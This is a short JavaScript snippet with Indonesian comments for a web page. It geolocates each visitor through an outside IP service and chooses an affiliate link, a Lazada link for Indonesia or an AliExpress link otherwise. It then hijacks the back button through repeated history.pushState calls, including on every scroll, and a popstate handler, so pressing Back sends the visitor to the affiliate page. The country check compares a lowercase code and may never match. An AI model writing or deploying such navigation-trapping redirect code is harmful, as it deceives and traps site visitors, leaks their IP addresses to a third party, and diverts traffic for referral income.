const targetDirectDisableBack = (() => {
  const country = 'id'; // kode negara Indonesia
  const targetDirectId = 'https://c.lazada.co.id/t/c.bdOcnQ?sub_aff_id=13maret'; // target redirect untuk Indonesia
  const targetDirectNonId = 'https://s.click.aliexpress.com/e/_DFG72Lt'; // target redirect untuk negara lain
  
  // deteksi IP negara pengunjung
  const xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://ipapi.co/json/', false);
  xhr.send();
  const { country_code } = JSON.parse(xhr.responseText);
  
  // redirect sesuai dengan negara
  if (country_code === country) {
    return targetDirectId;
  } else {
    return targetDirectNonId;
  }
})();

history.pushState(null, document.title, window.location.href);

window.addEventListener('popstate', function(event) {
  window.location.href = targetDirectDisableBack;
});

window.addEventListener('scroll', function() {
  history.pushState(null, document.title, window.location.href);
});
